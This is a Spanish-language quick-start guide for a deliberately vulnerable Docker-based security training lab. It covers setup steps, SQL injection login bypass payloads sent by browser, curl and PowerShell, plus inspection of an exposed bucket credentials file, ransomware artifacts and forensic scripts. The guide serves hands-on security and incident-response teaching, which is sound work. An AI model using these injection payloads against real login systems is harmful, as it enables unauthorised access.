# Guía de Inicio Rápido - Laboratorio de Seguridad TechSolutions

## 1. Prerrequisitos

```bash
# Instalar Node.js (18+)
node --version  # Debe ser 18+

# Instalar Docker y Docker Compose
docker --version
docker-compose --version
```

## 2. Configurar /etc/hosts

Agregar esta línea al archivo `/etc/hosts`:

```
127.0.0.1   techsolutions.com.test
```

En Linux/Mac:
```bash
sudo nano /etc/hosts
```

En Windows (como Administrador):
```
notepad C:\Windows\System32\drivers\etc\hosts
```

## 3. Clonar y Configurar

```bash
# Clonar el repositorio
git clone <your-repo-url>
cd techsolutions

# Instalar dependencias
npm install

# Copiar archivo de entorno
cp .env.example .env
```

## 4. Iniciar el Laboratorio

```bash
# Iniciar todos los servicios (base de datos + aplicación web)
docker-compose up -d

# Esperar a que la base de datos esté lista (10-15 segundos)
sleep 15

# Inicializar base de datos con datos vulnerables
npm run init-db

# Generar logs forenses
npm run generate-logs
```

## 5. Acceder a la Aplicación

La aplicación web ya está ejecutándose en Docker. Abrir el navegador y navegar a:
```
http://techsolutions.com.test:3000
```

**Credenciales de Prueba:**
- Usuario: `carlos.admin@techsolutions.com`
- Contraseña: `TechSol2024!Admin`

**Prueba de Inyección SQL:**
- Usuario: `admin' OR 1=1-- `
- Contraseña: `anything`

## 6. Explorar Vulnerabilidades

### Inyección SQL

**Desde el Frontend Web:**
- Navegar a http://techsolutions.com.test:3000
- Usuario: `admin' OR 1=1-- `
- Contraseña: `anything`

**Usando curl:**
```bash
# Probar con curl
curl -X POST http://techsolutions.com.test:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1-- ","password":"anything"}'
```

**Usando PowerShell:**
```powershell
# Crear archivo de payload
echo '{"username":"admin'\'' OR 1=1-- ","password":"anything"}' > payload.json
Invoke-WebRequest -Uri "http://techsolutions.com.test:3000/api/auth/login" `
  -Method POST -ContentType "application/json" -InFile "payload.json"
### Exposición de Bucket S3
```bash
# Ver archivos expuestos
ls -la s3-bucket/backups/
cat s3-bucket/backups/credentials.txt
```

### Artefactos de Ransomware
```bash
# Examinar archivos cifrados
ls ransomware/encrypted/
cat ransomware/README_DECRYPT.txt
```

## 7. Análisis Forense

```bash
# Generar timeline del ataque
npm run generate-timeline

# Verificar filtraciones de datos
npm run check-leaks

# Analizar ransomware
npm run analyze-ransomware

# Correlacionar eventos
npm run correlate-timeline
```

## 8. Detener el Laboratorio

```bash
# Detener todos los servicios
docker-compose down

# Remover volúmenes (estado limpio)
docker-compose down -v
```

## Solución de Problemas

### Puerto 3000 ya está en uso:
```bash
# Cambiar PORT en el archivo .env
PORT=3001
```

### Fallo de conexión a la base de datos:
```bash
# Reiniciar base de datos
docker-compose restart db

# Verificar logs de la base de datos
docker logs techsolutions-db
```

### No se puede resolver techsolutions.com.test:
```bash
# Verificar entrada en /etc/hosts
cat /etc/hosts | grep techsolutions
```

## Próximos Pasos

1. Leer el README.md completo
2. Seguir la FORENSIC_GUIDE.md
3. Probar todos los escenarios de explotación
4. Practicar respuesta a incidentes

¡Feliz hacking!
